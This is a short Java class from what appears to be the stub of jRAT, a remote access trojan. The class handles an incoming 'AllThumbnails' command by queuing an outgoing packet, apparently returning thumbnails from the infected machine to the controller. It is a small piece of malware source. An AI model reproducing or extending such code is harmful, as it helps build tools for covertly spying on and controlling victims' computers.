package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet71AllThumbnails;

public class Packet75AllThumbnails extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {		
		con.addToSendQueue(new Packet71AllThumbnails());
	}

}
